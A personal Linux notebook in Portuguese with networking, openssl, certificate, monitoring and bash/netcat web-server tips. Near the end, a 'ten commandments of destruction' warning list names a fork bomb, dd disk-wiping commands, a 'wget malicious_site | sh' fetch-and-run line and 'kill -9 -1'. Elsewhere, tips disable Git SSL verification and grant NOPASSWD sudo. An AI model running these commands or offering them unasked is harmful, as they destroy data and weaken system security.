---

---
>[!col]
>[[Linux Mint]]
>[[Manjaro no Dell Inspiron]]
>[[LMDE no Dell Inspiron]]
>[[linux shell fork bomb]]
>[[Gravador Guitarra no Linux]]
>[[EnvyX360 - HW List]]
>[[Baseus Bowie H1]]
>[[Linux productivity tools]]
>[[Nmap Cheatsheet]]
>[[Jhon The Ripper]]
>
>[[In addition to UGO/RWX permissions and ACLs (Access Control Lists), Linux uses file and directory attributes to control the level of access that system programs and users have to files.]]
>[[Understanding Linux kernel cgroups is crucial for efficient resource management and optimization in a distributed or cloud-based infrastructure.]]
>[[Want to master Linux Start by watching these 5 videos]]
>[[A Basic Guide to Modern Linux Boot Process 🐧↓]]
>[[Want to kill a process named foo that has been running for more than 48 hours under Linux  Try]]
>[[15 Tweaks to Make Nemo File Manager Even Better]]
>[[Blender Tutorials - Learn 3D Modeling, Animation & Shading  BlenderForge]]
>[[Win11]]
---
# Quick Tips

## Networking Commands

```bash
ss / netstat   → shows listening sockets, not firewall behavior
ip             → shows configuration, not end-to-end reachability
ping           → ICMP-based, not real traffic
traceroute/mtr → path info can be incomplete
dig/nslookup   → DNS only, not service health
nc             → basic port checks, limited context
curl           → app-layer view, not network internals
tracepath      → like traceroute / does not require superuser privileges
mtr            → like traceroute
tcptracerout   → like traceroute
iftop          → shows bandwidth usage per interface

dig:

	dig Hostname
	dig DomaiNameHere
	dig @DNS-server-name Hostname
	dig @DNS-server-name IPAddress
	dig @DNS-server-name Hostname|IPAddress type
	
Exemplo:
	dig google.com
	
	; <<>> DiG 9.18.39-0ubuntu0.24.04.6-Ubuntu <<>> google.com
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23459
	;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 4000
	;; QUESTION SECTION:
	;google.com.                    IN      A
	
	;; ANSWER SECTION:
	google.com.             209     IN      A       172.217.29.142
	
	;; Query time: 11 msec
	;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)
	;; WHEN: Fri Aug 21 16:22:29 -03 2026
	;; MSG SIZE  rcvd: 55
	
	dig @8.8.8.8 tre-pr.jus.br AAAA
	
	; <<>> DiG 9.18.39-0ubuntu0.24.04.6-Ubuntu <<>> @8.8.8.8 tre-pr.jus.br AAAA
	; (1 server found)
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17789
	;; flags: qr rd ra ad; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 512
	;; QUESTION SECTION:
	;tre-pr.jus.br.                 IN      AAAA
	
	;; ANSWER SECTION:
	tre-pr.jus.br.          20      IN      AAAA    2600:1419:2a00:4::5f65:1996
	tre-pr.jus.br.          20      IN      AAAA    2600:1419:2a00:4::5f65:1987
	
	;; Query time: 11 msec
	;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)
	;; WHEN: Fri Aug 21 16:27:40 -03 2026
	;; MSG SIZE  rcvd: 98
```

### Atalhos de teclado

```plain text
° = Ctrl + Shift + U: 00b0
ª = Ctrl + Shift + U: 00aa
```

### Processos vs Portas

```javascript
lsof -i :<porta>
```

### PDF no Linux

```shell
sudo apt install ghostscript
gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/prepress -dNOPAUSE -dQUIET -dBATCH -sOutputFile=compressed_PDF_file.pdf input_PDF_file.pdf
```

```shell
pdftk pdf_file_1 pdf_file_2 cat output final_pdf_file
```

### Vim - Salvando com sudo sem sair

```shell
:w !sudo tee %
```

### Adicionando Sudoers

```bash
sudo usermod -aG sudo user
sudo visudo

# john       ALL=(ALL:ALL) NOPASSWD:ALL
```

### Backup da MBR

```bash
dd if=/dev/sda of=sda.mbr bs=512 count=1
```

### Arquivos ZIP compatíveis com windows

```bash
zip -9 -y -r -q file.zip folder/
```

### Desabilitando verificação de SSL no Git

```shell
git config --global http.sslVerify false
```

### Automatização baseada em arquivo

gulp → monitora arquivo no linux e dispara uma ação

### Herança de grupo em subdiretórios

```javascript
chmod g+s .
```

Esse comando aplica o **bit SGID** (Set Group ID) ao diretório atual (representado pelo `.`).

Quando aplicado a um **diretório**, o SGID altera fundamentalmente o comportamento de herança de propriedade de grupo.

### Gerando um pendrive bootavel - ISO de distro linux

```bash
sudo dd if=Fedora.iso of=/dev/sdX bs=4M status=progress oflag=sync
```

# Codificação e Criptografia

## Base 64 Encoding and Decoding

```bash
# Help 
base64 --help

# base64 Encoding. watch out for EOL (End Of Line) Char
# -n will not append a EOL
echo -n "This is a line" | base64

# base64 Decoding
echo -n VGhpcyBpcyBhIGxpbmU= | base64 -d

# base64 Encoding of file
base64 dataimage.png
base64 dataimage.png > dataimage-base64.txt 

# Decoding 
base64 -d dataimage-base64.txt > dataimage-decoded.png
```

##  Url Encoding

```bash
# Help
urlencode

# Url Encode  
urlencode -m "http://mudra?user=test name"

# Url Decode
urlencode -d http%3A//mudra%3Fuser=test+name

# Use samltools
```

## Hashing

```bash
# Help
openssl dgst -help

# Default digest sha256
openssl dgst dataimage.png

openssl dgst -sha512 dataimage.png
openssl dgst -sha512 -binary dataimage.png
openssl dgst -sha512 -binary -out dataimage-dgst dataimage.png  

# For Text data. watch out for EOL
echo -n xxx | openssl dgst -sha512

# Show again. Will hash to the same value. Danger
# Use of Hash in password

# Password.Default salt (show this twice)
openssl passwd -6

# own salt 
openssl passwd -6 -salt ThisIsASalt password
```

##  Symmetric Encryption

```bash
# openssl enc for symmetric encryption and decryption 

# Help 
openssl enc -help 

# List of Ciphers
openssl enc -list

# AES encryption with secret hashed with SHA1. Salt is added automatically 
# -md Use digest sha1 to create key
echo -n "this is junk" |  openssl enc -aes-256-cbc -k secret -md sha1 -pbkdf2

# AES encryption with secret hashed with SHA1. Output is base64 encoded
echo -n "this is junk" |  openssl enc -aes-256-cbc -k secret -md sha1 -pbkdf2 -base64

# Encrypting a file
openssl enc -aes-256-cbc -k secret -md sha1 -base64 -pbkdf2 -in dataimage.png 

# Encrypting a file and then save to outout file
openssl enc -aes-256-cbc -k secret -md sha1 -base64 -pbkdf2 -in dataimage.png -out dataimage-enc

# Decrypting an encrypted data. Make sure size is same 
openssl enc -d -aes-256-cbc -k secret -md sha1 -base64 -pbkdf2 -in dataimage-enc -out dataimage-original.png
```

## Asymmetric Encryption & Decryption 

```bash
# Create a certificate request 
# Create a private key and self signed certificate
# -nodes - dont encrypt the private key
# -newkey rsa:2048 
# Why sha256 ? 
openssl req -x509 -nodes -sha256 -days 3650 -newkey rsa:2048 -keyout private.key -out certificate.crt

# openssl genrsa
# generates a RSA private key 

# Help
openssl genrsa -help

# Create a RSA private key of size 2048
openssl genrsa -out alice-private.pem 2048
openssl genrsa -out bob-private.pem 2048

# Encrypted. it will ask for secret 
openssl genrsa -aes256 -out private_enc.pem 2048 // encrypt using AES256

# Create public key
# will ask for secret if encrypted
openssl rsa -in alice-private.pem -pubout -out alice-public.pem
openssl rsa -in bob-private.pem -pubout -out bob-public.pem

# The pkeyutl command can be used to perform low-level public key operations using any 
# supported algorithm.
# encrypted using rsa
echo "Run for your life Now!" > important.txt

# Alice wants to send to bob. So encrypt using bob's public key 
openssl pkeyutl -encrypt -pubin -inkey bob-public.pem -in important.txt -out important.enc

# if important.txt is > key size we will have issue

# Bob will decrypt it using his private key
openssl pkeyutl -decrypt -inkey bob-private.pem -in important.enc
```

## Hybrid Encryption and Decryption 

```bash
# Generate a passphrase key. See num bytes is little less than 256 
openssl rand -out passphrase.key 245

# AES Encrypt Large data using generated passphrase
openssl enc -aes-256-cbc -kfile passphrase.key -md sha1 -base64 -pbkdf2 -in dataimage.png -out dataimage-aes

# RSA Encrypt the passphrase 
openssl pkeyutl -encrypt -pubin -inkey bob-public.pem -in passphrase.key -out passphrase_enc.key

# Send the dataimage-aes and passphrase_enc.key across

# Bob RSA Decrypts the passphrase
openssl pkeyutl -decrypt -inkey bob-private.pem -in passphrase_enc.key -out passphrase.key

# Bob will AES Decrypt the data using the passphrase
openssl enc -d -aes-256-cbc -kfile passphrase.key -md sha1 -base64 -pbkdf2 -in dataimage-aes -out dataimage_original.png
```

##  Signing & Verification (Using openssl dgst)

```bash
# Create a sha512 digest from dataimage.png, signs that digest with Alice's private key
# and outputs to dataimage-digest.sign
openssl dgst -sha512 -sign alice-private.pem -out dataimage-digest.sign dataimage.png

# Create base64 representation of dataimage-digest.sign
base64 dataimage-digest.sign > dataimage-digest.sign.base64 

# Create base64 representation of dataimage.png
base64 dataimage.png > dataimage.png.base64

# Alice will send both dataimage.png.base64 and dataimage-digest.sign.base64 to Bob 

# Bob will recover dataimage.png
base64 -d dataimage.png.base64 > dataimage.png.orig

# Bob will recover dataimage-digest.sign
base64 -d dataimage-digest.sign.base64 > dataimage-digest.sign.orig

# Bob will verify signature using Alice's public key
openssl dgst -sha512 -verify alice-public.pem -signature dataimage-digest.sign.orig dataimage.png.orig
```

##  Signing & Verification (Using openssl pkeyutl)

```bash
# Take a sha512 hash of the dataimage.png 
openssl dgst -sha512 -binary -out dataimage-digest dataimage.png 

# Alice will Sign the Hash using her private key 
openssl pkeyutl -sign -inkey alice-private.pem -in dataimage-digest -out dataimage-digest.sign

# Not shown : Alice will base 64 encode both Signature and Original Data
# Not shown : Bob will base 64 decode both Signature and Original Data

# Bob will verify signature using Alice's public key
openssl pkeyutl -verify -pubin -inkey alice-public.pem  -in dataimage-digest -sigfile dataimage-digest.sign
```

# Instalando certificados auto-assinados

```bash
sudo mkdir -p /usr/local/share/ca-certificates/extra
sudo cp ~/Downloads/empresa_ca.crt /usr/local/share/ca-certificates/extra/
sudo update-ca-certificates

# Caso o arquivo esteja em formato .pem:
# Navegue até o diretório para facilitar
cd /usr/local/share/ca-certificates/extra

# Renomeie o arquivo (substitua 'seu_arquivo.pem' pelo nome real)
sudo mv seu_arquivo.pem seu_arquivo.crt
sudo update-ca-certificates

sudo apt install libnss3-tools
certutil -A -n "Nome da Minha Empresa CA" -t "TC,," -i /usr/local/share/ca-certificates/extra/seu_arquivo.crt -d sql:$HOME/.pki/nssdb/
```

# Ferramentas de produtividade

[https://www.reddit.com/r/linuxbrasil/s/vYciNqmAEe](https://www.reddit.com/r/linuxbrasil/s/vYciNqmAEe)

- 📝 Obsidian (AppImage/Flatpak) — Anotações c
- ✅ Super Productivity (Flatpak) — Gerenciador de tarefas com integração ao GitHub/GitLab
- 📆 Morgen Calendar — Agenda moderna com foco e tarefas integradas
- 📋 CopyQ — Gerenciador de área de transferência avançado
- ⌨️ Albert / Ulauncher — Lançador de apps + produtividade com extensões

# Links

[https://github.com/wwmm/easyeffects](https://github.com/wwmm/easyeffects)
[https://diolinux.com.br/tutoriais/sosumi-vm-do-macos-no-linux.html](https://diolinux.com.br/tutoriais/sosumi-vm-do-macos-no-linux.html)
[https://itsfoss.com/compress-pdf-linux/](https://itsfoss.com/compress-pdf-linux/)
[https://linuxhandbook.com/journalctl-command/](https://linuxhandbook.com/journalctl-command/)
# Aplicações para Audio e Vídeo

- REAPER
- Odin 2
- Surge
- Ardour
- Avidemux - Editor de vídeo simples
- Blender 3D
- Cinelerra - Editor de vídeo bem completo, FREE
- Inkscape - Editor de imagens vetorial em SVG, FREE, bem completo
- Kdenlive - Editor de vídeo um pouco mais básico que o Cinelarra
- Olive - Editor de vídeo um pouco mais básico que o Cinelarra
- Shotwell - Editor/Organizador de fotos FREE. Pode ser instalado diretamente pelo Gnome

# Outras Dicas

## Inverter a imagem da webcam

```bash
# Solução 1 - Só funciona no contexto de uma aplicação por vez
export LIBV4LCONTROL_FLAGS=2 && LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libv4l/v4l1compat.so <comando para lançamento do aplicativo desejado>

# Solução 2 - Dispositivo de vídeo auxiliar
sudo apt-get install v4l-utils v4l2loopback-utils
sudo modprobe v4l2loopback exclusive_caps=1

# Verificando ...
sudo v4l2-ctl --list-devices

# Deve listar algo assim:
Dummy video device (0x0000) (platform:v4l2loopback-000):
	/dev/video4

HP TrueVision HD: HP TrueVision (usb-0000:00:12.0-1.3):
	/dev/video0
	/dev/video1
	/dev/media0

HP IR Camera: HP IR Camera (usb-0000:00:12.0-1.4):
	/dev/video2
	/dev/video3
	/dev/media1

# Copiando a imagem da câmera para o dispositivo auxiliar
sudo ffmpeg -f v4l2 -i /dev/video0 -vf "vflip" -f v4l2 /dev/video4
```

## Trabalhando com AppImages

```bash
# Extraindo a Imagem
./your.AppImage --appimage-extract

# Montando
mkdir /tmp/mountpoint
sudo mount -o loop your.AppImage /tmp/mountpoint

# Automatizando
<https://github.com/TheAssassin/AppImageLauncher>
```

## Script para renomear legendas de filmes

```bash
for x in `ls *.zip`;
	do
		unzip "$x";
	done;

for i in `ls *.mkv |awk -F "." '{print $5}'`;
	do
		j=`ls *.srt |grep $i`; k=`ls *.mkv |grep $i |sed 's/.mkv//'`;
		l=`echo $k".srt"`;
			if [ "$j" != "$l" ];
				then mv "$j" "$l";
			fi;
	done;
```

## Vim - Dicas

Situação: Todas as linhas deveriam acabar com o último campo terminando com ", porém no windows foram incluídas quebras de linha antes do fim da linha propriamente dita. No VIM, as quebras não precedidas de " podem ser removidas assim

`:%s/[^"]\\\\n//g`

![[SubPages/Pessoal/images/Untitled 31.png|651]]

## Monitoramento

```bash
sudo lsof -i :8081         // Qual proicessso está utilizando a porta
lsof                       // Processos e arquivos
uptime                     // Tempo de sistema
top
vmstat
iftop -i eth0
dmesg
lsusb
lshw
strace -p PID              // Investigar atividade de um PID
iotop
ss
alsamixer
xinput
curl wttr.in               // Previsão do tempo em shell
iperf                      // Speed test
scp -P5001 osboxes@10.6.63.14:/home/osboxes/CursoDocker.tar.gz .

# Trabalhando com módulos do kernel
insmod        // Apenas insere o módulo, sem verificar dependências. Normalmente resultará em erro. Deve ser fornecido o path do módulo
modprobe      // Realiza verificação de dependências. Localiza o módulo nas pastas padrões do linux
rmmod         // Remove módulo carregado via insmod ou modprobe
lsmod         // Lista os módulos carregados
depmod        // Atualiza a lista de módulos de forma que o modprobe encontre-os e resolva suas dependências. Normalmente utilizado após se instalar um novo módulo
```

## Atalhos de terminal

```plain text
Ctrl+R/O/G - histórico de comandos
Ctrl+L - clear
Crtl+U - Apaga a linha de comando desde o cursor
Ctrl+Z - manda p/ Background. Usar fg p/ retornar
Ctrl+A - cursor p/ inicio da linha
Ctrl+E - cursor p/ fim da linha
```

## CPU e GPU Info

```bash
# CPU e GPU info
# GLMARK2
glmark2

# Script
grep VGA /proc/pci || lspci | grep VGA | colrm 1 4 ;
egrep "model name|MHz" /proc/cpuinfo ;
xdpyinfo | egrep "version:|dimensions|depth of" ;
glxinfo | egrep -A2 "direct rendering|OpenGL vendor" ;
uname -sr ;
vblank_mode=0 glxgears & sleep 30 ;
killall glxgears

# GLXInfo
glxinfo | egrep -i 'device|memory'
grep -i --color memory /var/log/Xorg.0.log

#GPUSTAT
pip install gpustat
gpustat

#RadeonTop
$ sudo apt install radeontop
$ sudo radeontop
```

## Redimensionando partições NTFS

```plain text
ntfsresize --info /dev/sda2
ntfsresize --no-action --size 20000M /dev/sda2
ntfsresize --info --force /dev/sda2
```

## Alterando a compactação de um pacote .deb

```shell
ar x indicator-sound-switcher_2.3.7-1_all.deb
zstd -d < control.tar.zst | xz > control.tar.xz
zstd -d < data.tar.zst | xz > data.tar.xz
ar -m -c -a sdsd indicator-sound-switcher_repacked.deb debian-binary control.tar.xz data.tar.xz
rm debian-binary control.tar.xz data.tar.xz control.tar.zst data.tar.zst
```

## Docker - Instalando o certificado da CA de um registry

```shell
# Copiar o arquivo .crt para /usr/local/share/ca-certificates/
sudo update-ca-certificates
sudo systemctl restart docker
```

# Guias

<!-- Column 1 -->
![[image_8605b4ff-ee75-4a63-8c20-c8c78cdd238220211115_074818.jpg|651]]

![[image_fef62342-2096-4c25-bf90-79e91eb77cc620211115_074750.jpg|651]]

![[image_26af1568-9448-4a3b-a047-afce049d53c720211115_074743.jpg|651]]

<!-- Column 2 -->
![[image_24d0d329-2171-437e-a751-78a3e1758b5820211115_074811.jpg|651]]

![[image_25a86d59-0d0b-4a7d-89e5-a4de1335be6320211115_074759.jpg|651]]

![[SubPages/Pessoal/images/Untitled 32.png|651]]

<!-- Column 1 -->
![[SubPages/Pessoal/images/Untitled 33.png|651]]

<!-- Column 2 -->
![[image_79af856d-2e3b-4110-a6fb-3c77a7a53bdb20211115_074806.jpg|651]]

<!-- Column 1 -->
![[SubPages/Pessoal/images/Untitled 34.png|651]]

<!-- Column 2 -->
![[SubPages/Pessoal/images/image 23.png|651]]

# Linux e os 10 mandamentos da destruição.

1. :(){ :|:& };: — 💣 O infame fork bomb. Multiplica processos até o sistema implodir.
2. dd if=/dev/zero of=/dev/sda bs=1M — 💀 Sobrescreve todo o disco com zeros.
3. wget http://malicious_site -O- | sh — ☠️ Executa código direto da internet sem pensar duas vezes.
4. dd if=/dev/random of=/dev/sda — 🎲 Substitui o disco com dados aleatórios.
5. kill -9 -1 — 🔪 Mata todos os processos, incluindo os que você precisa pra respirar.

[https://vogelchr.blogspot.com/2012/11/ligthdm-custom-app-on-login-screen.html](https://vogelchr.blogspot.com/2012/11/ligthdm-custom-app-on-login-screen.html)
[https://askubuntu.com/questions/233068/run-conky-over-lightdm](https://askubuntu.com/questions/233068/run-conky-over-lightdm)



<!-- Column 1 -->
![[1000138431.png|651]]

<!-- Column 2 -->
![[1000138432.png|651]]

<!-- Column 3 -->
![[1000138433.png|651]]

<!-- Column 4 -->
![[1000138434.png|651]]

<!-- Column 1 -->
![[1000138435.png|651]]

<!-- Column 2 -->
![[1000138436.png|651]]

<!-- Column 3 -->
![[1000138437.png|651]]

<!-- Column 4 -->
![[1000138438.png|651]]

<!-- Column 1 -->
![[1000138440.png|651]]

<!-- Column 2 -->
![[1000138442.png|651]]

<!-- Column 3 -->
![[1000138443.png|651]]

<!-- Column 4 -->
![[1000138444.png|651]]

<!-- Column 1 -->
![[1000138445.png|651]]

<!-- Column 2 -->
![[1000138446.png|651]]

<!-- Column 3 -->
![[1000138447.png|651]]

---

# Criando um servidor HTTP com BASH

```bash
# Parte 1 - Entendendo os conceitos
#
# Unix Sockets
#
# Server
nc -Uvl server.sock

# Client
nc -Uv server.sock

# Respondendo e fechando a conexão
echo PONG | nc -UvlN server.sock
echo PING | nc -Uv server.sock

# TCP Sockets
echo PONG | nc -lvN 3000
echo PING | nc -v localhost 3000

# HTTP
echo -e 'HTTP/1.1 200\r\nContent-Type: application/text\r\n\r\nPONG' | nc -lvN 3000
echo -e 'GET / HTTP/1.1\r\n\r\n\r\nPING' | nc -vN localhost 3000
curl http://localhost:3000/ -d PING

# Adicionando HTML
echo -e 'HTTP/1.1 200\r\nContent-Type: text/html\r\n\r\n<h1>PONG</h1>' | nc -lvkN 3000

# NetCat (NC)
-U: Unix Socket
-v: Verbose
-l: Listen -> Server
-N: Encerra a conexão

# Parte 2 - Parsing de HTTP
# 
# FIFO
# 

mkfifo response
cat response | nc -lvN 3000
echo -e 'HTTP/1.1 200\r\n\r\n\r\n<h1>PONG</h1>' > response

# Estrutura básica de um servidor web:
# 
#!/bin/bash

### Create the response FIFO
rm -f response
mkfifo response

function handleRequest() {
    # 1) Process the request
    # 2) Route request to the correct handler
    # 3) Build a response based on the request
    # 4) Send the response to the named pipe (FIFO)
}

echo 'Listening on 3000...'

cat response | nc -lN 3000 | handleRequest

# Anatomia de uma mensagem HTTP:
#
# Request
#
# {http_verb} {path} {protocol_version} followed by a \r\n
# Headers in pattern of {header_name}: {header_value} followed by a \r\n
# Empty line followed by \r\n
# Request body (not mandatory)

GET / HTTP/1.1\r\n
Content-Type: text/html\r\n
\r\n
<h1>PING</h1>

# Response
#
# {protocol_version} {status_code} followed by a \r\n
# Headers
# Empty line followed by \r\n
# Response body

HTTP/1.1 200\r\n
Content-Type: text/html\r\n
\r\n
<h1>PONG</h1>
```

```bash
#!/bin/bash

### Create the response FIFO
rm -f response
mkfifo response

function handleRequest() {

  while read line; do
    echo $line
    # Remove o \r\n do final da linha
    trline=`echo $line | tr -d '[\r\n]'`

		# One-liner if. Interrompe se trline estiver vazio
		[ -z "$trline" ] && break 
		
		# Cria a regex da headline para verificar se corresponde ao padrão esperado
		HEADLINE_REGEX='(.*?)\s(.*?)\sHTTP.*?'
			
		# Se corresponder à regex, salva o verbo e o path na variável REQUEST
		[[ "$trline" =~ $HEADLINE_REGEX ]] &&
	    REQUEST=$(echo $trline | sed -E "s/$HEADLINE_REGEX/\1 \2/")
	    
	  # Regex para leitura do header Content-Length (possibilita a leitura do body do request)
		CONTENT_LENGTH_REGEX='Content-Length:\s(.*?)'  
		
		# Se corresponder, guarda o tamanho do body em bytes na variável CONTENT_LENGTH
		[[ "$trline" =~ $CONTENT_LENGTH_REGEX ]] &&
      CONTENT_LENGTH=`echo $trline | sed -E "s/$CONTENT_LENGTH_REGEX/\1/"`
  done
  
  ## Check if Content-Length is not empty
	if [ ! -z "$CONTENT_LENGTH" ]; then
	  BODY_REGEX='(.*?)=(.*?)'
	
	  ## Read the remaining request body
	  while read -n$CONTENT_LENGTH -t1 body; do
	    echo $body
	
	    INPUT_NAME=$(echo $body | sed -E "s/$BODY_REGEX/\1/")
	    INPUT_VALUE=$(echo $body | sed -E "s/$BODY_REGEX/\2/")
	  done
	fi
	
	case "$REQUEST" in
	  "GET /login") RESPONSE=$(cat login.html) ;;
				       *) RESPONSE=$(cat 404.html) ;;
	esac
	
	# Envia a resposta para o socket
	echo -e "$RESPONSE" > response
}

echo 'Listening on 3000...'

while true; do
	cat response | nc -lN 3000 | handleRequest
done
```

```html
HTTP/1.1 200 OK
Content-Type: text/html

<form method="POST" action="/login">
  <input type="text" name="name" />
  <input type="submit" value="Login" />
</form>
```

```html
HTTP/1.1 404 NotFound
Content-Type: text/html

<h1>Sorry, not found</h1>
```